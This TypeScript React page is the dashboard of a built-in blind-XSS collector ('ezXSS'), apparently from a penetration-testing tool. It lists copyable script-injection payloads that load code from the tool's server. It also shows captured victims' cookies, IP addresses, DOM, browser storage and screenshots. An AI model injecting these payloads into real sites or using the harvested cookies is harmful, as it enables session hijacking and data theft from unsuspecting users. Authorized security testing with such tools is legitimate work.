import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState, useEffect, useRef } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Sheet,
  SheetContent,
  SheetHeader,
  SheetTitle,
} from "@/components/ui/sheet";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import {
  IconTrash,
  IconCopy,
  IconCheck,
  IconWifi,
  IconWifiOff,
  IconCode,
  IconCamera,
  IconWorld,
  IconCookie,
  IconSettings,
  IconExternalLink,
} from "@tabler/icons-react";
import { toast } from "sonner";
import { API_URL } from "@/lib/config";
import { apiFetch } from "@/lib/apiFetch";
import { useCopyButton } from "@/hooks/useCopyButton";

export const Route = createFileRoute("/security/ezxss")({
  component: EzPage,
});

// ── Types ─────────────────────────────────────────────────────────────────────

interface EzCaptureItem {
  id: number;
  uri: string | null;
  origin: string | null;
  referer: string | null;
  userAgent: string | null;
  cookies: string | null;
  ipAddress: string | null;
  hasScreenshot: boolean;
  hasDom?: boolean;
  hasLocalStorage?: boolean;
  hasSessionStorage?: boolean;
  extra: string | null;
  programId: number | null;
  createdAt: string;
}

interface EzCaptureDetail extends EzCaptureItem {
  dom: string | null;
  localStorage: string | null;
  sessionStorage: string | null;
}

interface EzSettings {
  ezCollectDom: boolean;
  ezCollectCookies: boolean;
  ezCollectLocalStorage: boolean;
  ezCollectSessionStorage: boolean;
  ezCollectScreenshot: boolean;
}

// ── Helpers ───────────────────────────────────────────────────────────────────

function timeAgo(dateStr: string): string {
  const diff = Math.floor((Date.now() - new Date(dateStr).getTime()) / 1000);
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return `${Math.floor(diff / 86400)}d ago`;
}

function domainFromOrigin(origin: string | null): string {
  if (!origin) return "unknown";
  try { return new URL(origin).hostname; } catch { return origin; }
}

// ── Main page ─────────────────────────────────────────────────────────────────

function EzPage() {
  const queryClient = useQueryClient();
  const navigate = useNavigate();
  const { copy, isCopied } = useCopyButton();
  const wsRef = useRef<WebSocket | null>(null);

  const [wsConnected, setWsConnected] = useState(false);
  const [liveCaptures, setLiveCaptures] = useState<EzCaptureItem[]>([]);
  const [selectedId, setSelectedId] = useState<number | null>(null);
  const [drawerOpen, setDrawerOpen] = useState(false);
  const [showClearAllConfirm, setShowClearAllConfirm] = useState(false);
  const [deleteOneId, setDeleteOneId] = useState<number | null>(null);

  // ── Data fetching ───────────────────────────────────────────────────────────

  const { data: capturesData } = useQuery({
    queryKey: ["ez-captures"],
    queryFn: async () => {
      const res = await apiFetch(`${API_URL}/api/ez?limit=100`);
      if (!res.ok) throw new Error("Failed to fetch");
      return res.json() as Promise<{ data: EzCaptureItem[]; pagination: { total: number } }>;
    },
  });

  const { data: ezSettings } = useQuery<EzSettings>({
    queryKey: ["ez-settings"],
    queryFn: async () => {
      const res = await apiFetch(`${API_URL}/api/settings/ez`);
      if (!res.ok) throw new Error("Failed to fetch");
      return res.json();
    },
  });

  const { data: detail, isLoading: detailLoading } = useQuery<EzCaptureDetail>({
    queryKey: ["ez-capture", selectedId],
    queryFn: async () => {
      const res = await apiFetch(`${API_URL}/api/ez/${selectedId}`);
      if (!res.ok) throw new Error("Failed to fetch");
      return res.json();
    },
    enabled: drawerOpen && selectedId !== null,
  });

  // ── Merge API captures + live captures (deduplicated by id) ────────────────

  const allCaptures: EzCaptureItem[] = (() => {
    const apiItems = capturesData?.data ?? [];
    const liveIds = new Set(liveCaptures.map((c) => c.id));
    const merged = [...liveCaptures, ...apiItems.filter((c) => !liveIds.has(c.id))];
    return merged.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
  })();

  // ── WebSocket ───────────────────────────────────────────────────────────────

  useEffect(() => {
    let destroyed = false;
    let reconnectTimeout: ReturnType<typeof setTimeout>;
    const WS_URL = API_URL.replace(/^http/, "ws") + "/api/ws/events";

    async function connect() {
      if (destroyed) return;
      const { getAccessToken } = await import("@/lib/auth");
      const token = await getAccessToken();
      if (!token) {
        if (!destroyed) reconnectTimeout = setTimeout(connect, 3000);
        return;
      }
      const ws = new WebSocket(`${WS_URL}?token=${token}`);
      wsRef.current = ws;
      ws.onopen = () => setWsConnected(true);
      ws.onclose = () => {
        setWsConnected(false);
        if (!destroyed) reconnectTimeout = setTimeout(connect, 3000);
      };
      ws.onerror = () => ws.close();
      ws.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);
          if (msg.type !== "ez") return;
          const capture: EzCaptureItem = msg.data;
          setLiveCaptures((prev) => {
            if (prev.some((c) => c.id === capture.id)) return prev;
            return [capture, ...prev];
          });
        } catch {}
      };
    }

    connect();
    return () => {
      destroyed = true;
      clearTimeout(reconnectTimeout);
      wsRef.current?.close();
    };
  }, []);

  // ── Mutations ───────────────────────────────────────────────────────────────

  const deleteOne = useMutation({
    mutationFn: async (id: number) => {
      const res = await apiFetch(`${API_URL}/api/ez/${id}`, { method: "DELETE" });
      if (!res.ok) throw new Error("Failed to delete");
    },
    onSuccess: (_, id) => {
      setLiveCaptures((prev) => prev.filter((c) => c.id !== id));
      queryClient.invalidateQueries({ queryKey: ["ez-captures"] });
      if (selectedId === id) setDrawerOpen(false);
      toast.success("Capture deleted");
    },
    onError: () => toast.error("Failed to delete"),
  });

  const clearAll = useMutation({
    mutationFn: async () => {
      const res = await apiFetch(`${API_URL}/api/ez`, { method: "DELETE" });
      if (!res.ok) throw new Error("Failed to clear");
    },
    onSuccess: () => {
      setLiveCaptures([]);
      queryClient.invalidateQueries({ queryKey: ["ez-captures"] });
      setDrawerOpen(false);
      toast.success("All captures cleared");
    },
    onError: () => toast.error("Failed to clear"),
  });

  // ── Payload variants ────────────────────────────────────────────────────────

  const payloadUrl = `${API_URL}/ez`;
  const variants = [
    { id: "script",   label: "<script>",  value: `<script src="${payloadUrl}"></script>` },
    { id: "escape1",  label: 'Escape "',  value: `"><script src="${payloadUrl}"></script>` },
    { id: "escape2",  label: "Escape '",  value: `'><script src="${payloadUrl}"></script>` },
    { id: "import",   label: "import()",  value: `javascript:import('${payloadUrl}')` },
  ];

  // ── Render ──────────────────────────────────────────────────────────────────

  return (
    <div className="flex flex-1 flex-col gap-4 p-4 sm:p-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <h1 className="text-xl font-bold sm:text-2xl">ezXSS</h1>
          <Badge
            variant="outline"
            className={
              wsConnected
                ? "border-emerald-200 text-emerald-600 dark:border-emerald-800 dark:text-emerald-400"
                : "border-red-200 text-red-500"
            }
          >
            {wsConnected ? <IconWifi className="size-3 mr-1" /> : <IconWifiOff className="size-3 mr-1" />}
            {wsConnected ? "Live" : "Offline"}
          </Badge>
          {allCaptures.length > 0 && (
            <Badge variant="secondary">{allCaptures.length} capture{allCaptures.length !== 1 ? "s" : ""}</Badge>
          )}
        </div>
        <div className="flex items-center gap-2">
          <Button
            variant="ghost"
            size="sm"
            onClick={() => navigate({ to: '/settings', hash: 'ez' })}
            className="gap-1.5"
          >
            <IconSettings className="size-4" />
            <span className="hidden sm:inline">Settings</span>
          </Button>
          {allCaptures.length > 0 && (
            <Button
              variant="destructive"
              size="sm"
              onClick={() => setShowClearAllConfirm(true)}
              disabled={clearAll.isPending}
              className="gap-1.5"
            >
              <IconTrash className="size-4" />
              <span className="hidden sm:inline">Clear all</span>
            </Button>
          )}
        </div>
      </div>

      {/* Attribution notice */}
      <div className="flex items-start gap-2 rounded-lg border border-blue-300 dark:border-blue-700 bg-blue-50 dark:bg-blue-950/40 px-4 py-3 text-xs text-blue-700 dark:text-blue-300">
        <IconCode className="size-3.5 mt-0.5 shrink-0" />
        <p>
          This is a lightweight built-in ezXSS — not a replacement for the real thing.
          For the full experience (advanced payload management, rich dashboard, multi-user support and more),
          check out the amazing work by{" "}
          <a
            href="https://github.com/ssl/ezXSS"
            target="_blank"
            rel="noopener noreferrer"
            className="font-semibold text-blue-800 dark:text-blue-200 underline underline-offset-2 hover:text-blue-600 dark:hover:text-blue-100 transition-colors"
          >
            @ssl — ezXSS
          </a>
          . Both tools are fully compatible — you can run ezXSS alongside this server if you need.
        </p>
      </div>

      {/* Payload panel */}
      <Card>
        <CardHeader className="pb-3">
          <div className="flex items-center justify-between flex-wrap gap-2">
            <CardTitle className="text-sm font-semibold flex items-center gap-2">
              <IconCode className="size-4 text-muted-foreground" />
              Injection Payload
            </CardTitle>
            <div className="flex items-center gap-1.5">
              {ezSettings?.ezCollectScreenshot && (
                <Badge variant="outline" className="text-xs border-violet-200 text-violet-600 dark:border-violet-800 dark:text-violet-400">
                  <IconCamera className="size-3 mr-1" />Screenshot ON
                </Badge>
              )}
              <Badge variant="outline" className="text-xs font-mono">{payloadUrl}</Badge>
            </div>
          </div>
        </CardHeader>
        <CardContent className="pt-0">
          <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
            {variants.map((v) => (
              <div
                key={v.id}
                className="flex items-center justify-between gap-2 rounded-md border bg-muted/30 px-3 py-2"
              >
                <div className="flex items-center gap-2 min-w-0">
                  <Badge variant="secondary" className="text-xs shrink-0">{v.label}</Badge>
                  <code className="text-xs text-muted-foreground truncate">{v.value}</code>
                </div>
                <Button
                  variant="ghost"
                  size="icon"
                  className="size-7 shrink-0"
                  onClick={() => copy(v.value, v.id, v.label)}
                >
                  {isCopied(v.id) ? (
                    <IconCheck className="size-3.5 text-emerald-500" />
                  ) : (
                    <IconCopy className="size-3.5" />
                  )}
                </Button>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Capture list */}
      {allCaptures.length === 0 ? (
        <div className="flex flex-1 flex-col items-center justify-center gap-3 text-muted-foreground py-16">
          <IconWorld className="size-10 opacity-30" />
          <p className="text-sm">No captures yet — inject the payload and wait</p>
        </div>
      ) : (
        <div className="flex flex-col gap-2">
          {allCaptures.map((cap) => (
            <CaptureCard
              key={cap.id}
              cap={cap}
              onView={() => { setSelectedId(cap.id); setDrawerOpen(true); }}
              onDelete={() => setDeleteOneId(cap.id)}
              copy={copy}
              isCopied={isCopied}
            />
          ))}
        </div>
      )}

      {/* Clear All Confirmation */}
      <AlertDialog open={showClearAllConfirm} onOpenChange={setShowClearAllConfirm}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Clear all captures?</AlertDialogTitle>
            <AlertDialogDescription>
              This will permanently delete all {allCaptures.length} ezXSS capture{allCaptures.length !== 1 ? "s" : ""} and their screenshots. This action cannot be undone.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>Cancel</AlertDialogCancel>
            <AlertDialogAction
              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
              onClick={() => { clearAll.mutate(); setShowClearAllConfirm(false); }}
            >
              Clear All
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Single Capture Delete Confirmation */}
      <AlertDialog open={deleteOneId !== null} onOpenChange={(open) => { if (!open) setDeleteOneId(null); }}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Delete this capture?</AlertDialogTitle>
            <AlertDialogDescription>
              This will permanently delete the ezXSS capture and its screenshot. This action cannot be undone.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>Cancel</AlertDialogCancel>
            <AlertDialogAction
              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
              onClick={() => { if (deleteOneId !== null) { deleteOne.mutate(deleteOneId); setDeleteOneId(null); } }}
            >
              Delete
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Detail drawer */}
      <Sheet open={drawerOpen} onOpenChange={setDrawerOpen}>
        <SheetContent side="right" className="w-full sm:max-w-2xl p-0 flex flex-col">
          {selectedId && (
            <CaptureDetail
              id={selectedId}
              detail={detail ?? null}
              loading={detailLoading}
              onDelete={() => setDeleteOneId(selectedId)}
            />
          )}
        </SheetContent>
      </Sheet>
    </div>
  );
}

// ── Capture card ──────────────────────────────────────────────────────────────

function CaptureCard({
  cap,
  onView,
  onDelete,
  copy,
  isCopied,
}: {
  cap: EzCaptureItem;
  onView: () => void;
  onDelete: () => void;
  copy: (text: string, id: string, label: string) => void;
  isCopied: (id: string) => boolean;
}) {
  const domain = domainFromOrigin(cap.origin);

  return (
    <Card
      className="cursor-pointer hover:bg-muted/20 transition-colors overflow-hidden"
      onClick={onView}
    >
      <div className="flex items-center gap-3 px-4 py-3">
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="font-mono font-semibold text-sm truncate max-w-[200px]">{domain}</span>
            {cap.ipAddress && (
              <Badge variant="outline" className="text-xs font-mono">{cap.ipAddress}</Badge>
            )}
            {cap.hasScreenshot && (
              <Badge variant="outline" className="text-xs border-violet-200 text-violet-600 dark:border-violet-800 dark:text-violet-400">
                <IconCamera className="size-3 mr-0.5" />SS
              </Badge>
            )}
            {cap.hasDom && (
              <Badge variant="outline" className="text-xs border-blue-200 text-blue-600 dark:border-blue-800 dark:text-blue-400">
                DOM
              </Badge>
            )}
            {cap.hasLocalStorage && (
              <Badge variant="outline" className="text-xs border-amber-200 text-amber-600 dark:border-amber-800 dark:text-amber-400">
                LS
              </Badge>
            )}
          </div>
          {cap.cookies ? (
            <div className="mt-1 flex items-center gap-1.5">
              <IconCookie className="size-3 text-muted-foreground shrink-0" />
              <span className="text-xs text-muted-foreground font-mono truncate">
                {cap.cookies.slice(0, 120)}{cap.cookies.length > 120 ? "…" : ""}
              </span>
            </div>
          ) : (
            <p className="mt-1 text-xs text-muted-foreground">No cookies</p>
          )}
        </div>
        <div className="flex items-center gap-1.5 shrink-0" onClick={(e) => e.stopPropagation()}>
          <span className="text-xs text-muted-foreground hidden sm:inline">{timeAgo(cap.createdAt)}</span>
          {cap.cookies && (
            <Button
              variant="ghost"
              size="icon"
              className="size-7"
              title="Copy cookies"
              onClick={(e) => { e.stopPropagation(); copy(cap.cookies!, `cookies-${cap.id}`, "Cookies"); }}
            >
              {isCopied(`cookies-${cap.id}`) ? (
                <IconCheck className="size-3.5 text-emerald-500" />
              ) : (
                <IconCopy className="size-3.5" />
              )}
            </Button>
          )}
          <Button
            variant="ghost"
            size="icon"
            className="size-7 text-destructive hover:text-destructive"
            title="Delete"
            onClick={(e) => { e.stopPropagation(); onDelete(); }}
          >
            <IconTrash className="size-3.5" />
          </Button>
        </div>
      </div>
    </Card>
  );
}

// ── Detail sheet ──────────────────────────────────────────────────────────────

function CaptureDetail({
  id,
  detail,
  loading,
  onDelete,
}: {
  id: number;
  detail: EzCaptureDetail | null;
  loading: boolean;
  onDelete: () => void;
}) {
  const { copy, isCopied } = useCopyButton();
  const [domPreviewOpen, setDomPreviewOpen] = useState(false);

  return (
    <>
      <SheetHeader className="px-5 pt-5 pb-3 border-b shrink-0">
        <div className="flex items-start justify-between gap-3">
          <div className="min-w-0">
            <SheetTitle className="text-base font-mono truncate">
              {domainFromOrigin(detail?.origin ?? null)}
            </SheetTitle>
            {detail?.uri && (
              <a
                href={detail.uri}
                target="_blank"
                rel="noreferrer"
                className="flex items-center gap-1 text-xs text-muted-foreground hover:text-foreground mt-0.5 truncate"
              >
                <IconExternalLink className="size-3 shrink-0" />
                <span className="truncate">{detail.uri}</span>
              </a>
            )}
          </div>
          <Button variant="destructive" size="sm" onClick={onDelete} className="shrink-0">
            <IconTrash className="size-3.5 mr-1" />
            Delete
          </Button>
        </div>
      </SheetHeader>

      {loading ? (
        <div className="flex flex-1 items-center justify-center text-muted-foreground text-sm p-8">
          Loading…
        </div>
      ) : !detail ? (
        <div className="flex flex-1 items-center justify-center text-muted-foreground text-sm p-8">
          Capture not found
        </div>
      ) : (
        <Tabs defaultValue="overview" className="flex flex-col flex-1 min-h-0 overflow-hidden">
          <TabsList className="mx-5 mt-3 shrink-0 w-fit">
            <TabsTrigger value="overview">Overview</TabsTrigger>
            <TabsTrigger value="dom" disabled={!detail.dom}>DOM</TabsTrigger>
            <TabsTrigger value="storage" disabled={!detail.localStorage && !detail.sessionStorage}>
              Storage
            </TabsTrigger>
            <TabsTrigger value="screenshot" disabled={!detail.hasScreenshot}>
              Screenshot
            </TabsTrigger>
          </TabsList>

          {/* Overview */}
          <TabsContent value="overview" className="flex-1 overflow-auto px-5 pb-5 mt-3">
            <div className="space-y-3 text-sm">
              <DetailRow label="Origin"     value={detail.origin}    mono />
              <DetailRow label="URI"        value={detail.uri}       mono />
              <DetailRow label="Referer"    value={detail.referer}   mono />
              <DetailRow label="IP Address" value={detail.ipAddress} mono />
              <DetailRow label="User Agent" value={detail.userAgent} />
              {detail.cookies && (
                <div className="space-y-1">
                  <div className="flex items-center justify-between">
                    <span className="text-muted-foreground text-xs font-medium uppercase tracking-wide">Cookies</span>
                    <Button
                      variant="ghost"
                      size="sm"
                      className="h-6 px-2 text-xs gap-1"
                      onClick={() => copy(detail.cookies!, "detail-cookies", "Cookies")}
                    >
                      {isCopied("detail-cookies") ? <IconCheck className="size-3" /> : <IconCopy className="size-3" />}
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted/40 rounded-md px-3 py-2 text-xs font-mono whitespace-pre-wrap break-all max-h-48 overflow-auto">
                    {detail.cookies}
                  </pre>
                </div>
              )}
              {detail.extra && (() => {
                try {
                  return (
                    <div className="space-y-1">
                      <span className="text-muted-foreground text-xs font-medium uppercase tracking-wide">Extra (ez_a)</span>
                      <pre className="bg-muted/40 rounded-md px-3 py-2 text-xs font-mono whitespace-pre-wrap break-all max-h-32 overflow-auto">
                        {JSON.stringify(JSON.parse(detail.extra), null, 2)}
                      </pre>
                    </div>
                  );
                } catch { return null; }
              })()}
            </div>
          </TabsContent>

          {/* DOM */}
          <TabsContent value="dom" className="flex-1 overflow-hidden px-5 pb-5 mt-3 flex flex-col gap-2">
            <div className="flex items-center justify-between shrink-0">
              <span className="text-xs text-muted-foreground">{detail.dom?.length?.toLocaleString()} chars</span>
              <div className="flex gap-2">
                <Button
                  variant="outline"
                  size="sm"
                  className="h-7 text-xs gap-1"
                  onClick={() => copy(detail.dom!, "detail-dom", "DOM")}
                >
                  {isCopied("detail-dom") ? <IconCheck className="size-3" /> : <IconCopy className="size-3" />}
                  Copy
                </Button>
                <Button
                  variant="outline"
                  size="sm"
                  className="h-7 text-xs gap-1"
                  onClick={() => setDomPreviewOpen(true)}
                >
                  <IconExternalLink className="size-3" />
                  Preview
                </Button>
              </div>
            </div>
            <pre className="flex-1 overflow-auto bg-muted/40 rounded-md px-3 py-2 text-xs font-mono whitespace-pre-wrap break-all">
              {detail.dom}
            </pre>
          </TabsContent>

          {/* Storage */}
          <TabsContent value="storage" className="flex-1 overflow-auto px-5 pb-5 mt-3">
            <div className="space-y-4">
              <StorageSection title="localStorage" raw={detail.localStorage} />
              <StorageSection title="sessionStorage" raw={detail.sessionStorage} />
            </div>
          </TabsContent>

          {/* Screenshot */}
          <TabsContent value="screenshot" className="flex-1 overflow-auto px-5 pb-5 mt-3">
            <ScreenshotImage id={id} />
          </TabsContent>
        </Tabs>
      )}

      {/* DOM preview — sandboxed iframe, no scripts can execute */}
      <Dialog open={domPreviewOpen} onOpenChange={setDomPreviewOpen}>
        <DialogContent className="max-w-5xl w-full h-[80vh] flex flex-col p-0">
          <DialogHeader className="px-5 pt-4 pb-3 border-b shrink-0">
            <DialogTitle className="text-sm font-medium flex items-center gap-2">
              <IconCode className="size-4 text-muted-foreground" />
              DOM Preview
              <span className="text-xs font-normal text-muted-foreground ml-1">(sandboxed — scripts disabled)</span>
            </DialogTitle>
          </DialogHeader>
          {detail?.dom && (
            <iframe
              srcDoc={detail.dom}
              sandbox=""
              className="flex-1 w-full border-0"
              title="Sandboxed DOM preview"
            />
          )}
        </DialogContent>
      </Dialog>
    </>
  );
}

// ── Shared sub-components ─────────────────────────────────────────────────────

function DetailRow({
  label,
  value,
  mono = false,
}: {
  label: string;
  value: string | null | undefined;
  mono?: boolean;
}) {
  if (!value) return null;
  return (
    <div className="space-y-0.5">
      <span className="text-muted-foreground text-xs font-medium uppercase tracking-wide">{label}</span>
      <p className={`break-all ${mono ? "font-mono text-xs" : "text-sm"}`}>{value}</p>
    </div>
  );
}

// Fetches the screenshot with the auth bearer token and renders it via an object URL.
// A plain <img src="/api/ez/:id/screenshot"> would send no Authorization header and get 401.
function ScreenshotImage({ id }: { id: number }) {
  const [objectUrl, setObjectUrl] = useState<string | null>(null);
  const [failed, setFailed] = useState(false);

  useEffect(() => {
    let revoked = false;
    apiFetch(`${API_URL}/api/ez/${id}/screenshot`)
      .then((res) => (res.ok ? res.blob() : Promise.reject()))
      .then((blob) => {
        if (!revoked) setObjectUrl(URL.createObjectURL(blob));
      })
      .catch(() => { if (!revoked) setFailed(true); });

    return () => {
      revoked = true;
      setObjectUrl((prev) => { if (prev) URL.revokeObjectURL(prev); return null; });
    };
  }, [id]);

  if (failed) return <p className="text-sm text-muted-foreground">Screenshot unavailable.</p>;
  if (!objectUrl) return <p className="text-sm text-muted-foreground">Loading screenshot…</p>;
  return <img src={objectUrl} alt="Page screenshot at time of XSS" className="w-full rounded-md border" />;
}

function StorageSection({ title, raw }: { title: string; raw: string | null | undefined }) {
  if (!raw) {
    return (
      <div>
        <p className="text-xs font-medium text-muted-foreground uppercase tracking-wide mb-1">{title}</p>
        <p className="text-xs text-muted-foreground italic">Empty</p>
      </div>
    );
  }
  let formatted = raw;
  try { formatted = JSON.stringify(JSON.parse(raw), null, 2); } catch {}
  return (
    <div className="space-y-1">
      <p className="text-xs font-medium text-muted-foreground uppercase tracking-wide">{title}</p>
      <pre className="bg-muted/40 rounded-md px-3 py-2 text-xs font-mono whitespace-pre-wrap break-all max-h-64 overflow-auto">
        {formatted}
      </pre>
    </div>
  );
}
